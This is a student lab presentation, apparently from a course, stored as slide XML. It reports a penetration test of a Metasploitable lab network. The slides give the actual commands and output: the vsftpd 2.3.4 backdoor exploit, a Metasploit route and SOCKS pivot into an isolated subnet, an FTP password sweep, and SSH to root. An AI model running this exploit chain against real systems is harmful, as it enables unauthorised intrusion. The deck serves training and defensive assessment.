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-title-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Alone Did Not Stop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External Attacker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ShopEase Corp — Internal Network Penetration Test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828800" cy="3200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 Tamer Atef   ·   Marwan Ahmed Ibrahim   ·   Mahmoud Abdelraouf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Lab Presentation  ·  August 2026</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Title Illustration" descr="Abstract diagram of two isolated network segments bridged by a single pivot host, illustrating the deck's central find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000" y="3393500"/>
            <a:ext cx="1500000" cy="150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is a standard control — but is it sufficient by itself?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design assumption: </a:t>
            </a:r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isolating sensitive systems on their own subnet limits what an external attacker can reach.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"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Untested assumption: </a:t>
            </a:r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isolation only holds if every host touching both networks is itself secure.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"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engagement: </a:t>
            </a:r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lab network built specifically to test that assumption — one attacker-reachable host bridges two otherwise separate subnets.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320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ShopEase Corp Network Pentest Resource Pack (course-provided lab brief)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engagement asks: can an isolated internal segment be reached at all?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88720" y="1600200"/>
            <a:ext cx="6766560" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EBF3FA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17373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with no privileged access and no route to the internal segment, can an attacker compromise the network boundary host and use it to reach and compromise hosts on 10.10.20.0/24?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461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Constraint: </a:t>
            </a:r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10.10.20.0/24 has no direct route from the attacker's Kali host — by design, not by accident.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condition: </a:t>
            </a:r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reaching that segment requires defeating the boundary, not just compromising the DMZ host.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dual-homed pivot host is the only bridge between two isolated subnets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="/home/claude/shopease-repo/docs/diagrams/attack_chain_pivot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5120640" cy="3429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806440" y="15087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806440" y="187452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segment: 10.10.10.0/24 (Kali)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host: Metasploitable2, dual-homed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segment: 10.10.20.0/24 (isolated)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scope: host machine, hypervisor, physical LAN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320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topology built per ShopEase Network Pentest Resource Pack, Section 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recon surfaces vsftpd 2.3.4 — a version with a public backdoor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508760"/>
            <a:ext cx="8229600" cy="214884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00200"/>
            <a:ext cx="79552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nmap -A -p- -T4 10.10.10.5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PORT     STATE SERVICE  VERSION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21/tcp   open  ftp      vsftpd 2.3.4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|_ftp-anon: Anonymous FTP login allowed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22/tcp   open  ssh      OpenSSH 4.7p1 (weak 1024-bit DSA key)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23/tcp   open  telnet   Linux telnetd (cleartext)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25/tcp   open  smtp     Postfix smtpd (self-signed cert)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" y="2244852"/>
            <a:ext cx="4572000" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="B326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069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vsftpd 2.3.4: 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exact build version is publicly known to contain a backdoor — the single highest-value lead on this host.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secondary findings: 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 FTP, weak SSH host key, telnet, weak TLS cert — evidence of general neglect, not the entry point.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one-line module search maps the version directly to a root shell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508760"/>
            <a:ext cx="8229600" cy="228600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00200"/>
            <a:ext cx="7955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msf &gt; search vsftpd 2.3.4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0  exploit/unix/ftp/vsftpd_234_backdoor   excellent   Yes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msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor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msf exploit(...) &gt; set lhost 10.10.10.10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msf exploit(...) &gt; set rhosts 10.10.10.5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msf exploit(...) &gt; exploit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[+] 10.10.10.5:21 - Backdoor has been spawned!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[*] Meterpreter session 1 opened (10.10.10.10:4444 -&gt; 10.10.10.5:37056)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version match: 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nmap string maps to exactly one module, ranked excellent — no crafted exploit needed.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on connect: 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backdoor returns a root shell immediately; no separate privilege escalation step required.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compromised session is turned into a route across the segmentation boundary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274320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00200"/>
            <a:ext cx="7955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meterpreter &gt; background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msf exploit(...) &gt; route add 10.10.20.0 255.255.255.0 1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[*] Route added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Subnet         Netmask          Gateway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10.10.20.0     255.255.255.0    Session 1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msf exploit(...) &gt; use auxiliary/server/socks_proxy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msf auxiliary(server/socks_proxy) &gt; set srvhost 127.0.0.1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msf auxiliary(server/socks_proxy) &gt; set version 4a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msf auxiliary(server/socks_proxy) &gt; exploit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[*] Starting the SOCKS proxy server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add: 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Metasploit to tunnel traffic for 10.10.20.0/24 through Session 1.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SOCKS proxy: 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exposes that same reachability to external tools (nmap, ssh) via proxychains.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probe through the tunnel confirms segmentation was bypassed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274320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00200"/>
            <a:ext cx="7955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proxychains nmap -sT -Pn -p 21,22,80,445,8080 10.10.20.12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[proxychains] Strict chain  127.0.0.1:1080  10.10.20.12:21   OK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[proxychains] Strict chain  127.0.0.1:1080  10.10.20.12:22   OK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[proxychains] Strict chain  127.0.0.1:1080  10.10.20.12:80   OK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[proxychains] Strict chain  127.0.0.1:1080  10.10.20.12:445  OK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[proxychains] Strict chain  127.0.0.1:1080  10.10.20.12:8080 OK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PORT     STATE SERVICE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21/tcp   open  ftp        22/tcp   open  ssh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80/tcp   open  http       445/tcp  open  microsoft-ds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8080/tcp open  http-proxy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-sT -Pn required: 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SOCKS can't relay raw SYN probes or ICMP pings — only full TCP connects.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5 ports OK: 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tunnel is confirmed working end-to-end before any exploitation is attempted.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curated wordlist sweep finds one password reused across three accounts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228600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00200"/>
            <a:ext cx="7955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msf auxiliary(scanner/ftp/ftp_login) &gt; set USER_FILE .../ftpd/username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msf auxiliary(scanner/ftp/ftp_login) &gt; set PASS_FILE .../ftpd/password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msf auxiliary(scanner/ftp/ftp_login) &gt; set RHOSTS 10.10.20.12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msf auxiliary(scanner/ftp/ftp_login) &gt; run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[+] 10.10.20.12:21 - Login Successful: vagrant:vagrant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[+] 10.10.20.12:21 - Login Successful: Administrator:vagrant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[+] 10.10.20.12:21 - Login Successful: administrator:vagrant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[*] Scanned 1 of 1 hosts (100% complete)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75488" y="2682240"/>
            <a:ext cx="8193024" cy="716280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="B326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Metasploitable3's own wordlists: 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targeted sweep, not a blind brute-force.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password, three accounts: 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vagrant validates against a standard AND two admin account variants.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reused credential converts directly into root — no escalation technique needed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228600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00200"/>
            <a:ext cx="7955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proxychains ssh vagrant@10.10.20.12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vagrant@10.10.20.12's password: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Welcome to Ubuntu 14.04.6 LTS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vagrant@metasploitable3-ub1404:~$ sudo -i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root@metasploitable3-ub1404:~# whoami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root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root@metasploitable3-ub1404:~# pwd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/root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password, second service: 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vagrant:vagrant, already confirmed over FTP, also unlocks SSH.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Unrestricted sudo: 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access required a single command — no misconfiguration to chain, just an over-privileged account.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held at the network layer — it failed at the boundary host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design was correct: </a:t>
            </a:r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10.10.20.0/24 had no direct route from the attacker.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"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was on the boundary host: </a:t>
            </a:r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unpatched, backdoored FTP service gave immediate root.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"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hardening did not compensate: </a:t>
            </a:r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guessable password, reused across accounts, with unrestricted sudo.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limitation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pivot host and the internal Linux target are assessed here; the internal Windows host remains untested.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the internal Windows host and a full internal-segment sweep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6002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Metasploitable3-Windows: </a:t>
            </a:r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discovered or tested — its IP on 10.10.20.0/24 is still unconfirmed.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internal port sweep: </a:t>
            </a:r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5-port scan (Slide 8) targeted a shortlist; a full TCP/UDP sweep may surface additional hosts and services.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table: </a:t>
            </a:r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findings validated so far across 2 hosts; the 12-finding minimum requires the Windows host and remaining recon.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Segmentation alone was not sufficient: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attack path reached the isolated internal segment.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boundary host was the single point of failure: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unpatched service gave root, and root gave a tunnel.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Internal hardening did not compensate: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reused, wordlist-guessable password reached root on the internal target.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ShopEase Corp Internal Network PT  |  Team: Atef, Ibrahim, Abdelraouf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86868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Rapid7. vsftpd_234_backdoor — VSFTPD v2.3.4 Backdoor Command Execution. Metasploit module documentation.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CVE-2011-2523 — vsftpd 2.3.4 Backdoor Command Execution.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Rapid7. Metasploitable3. https://github.com/rapid7/metasploitable3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haad / Various contributors. Proxychains-ng. https://github.com/rofl0r/proxychains-ng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ShopEase Corp Network Pentest Resource Pack (course-provided lab brief).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2026-08-27T07:19:25Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-27T07:19:25Z</dcterms:modified>
</cp:coreProperties>
</file>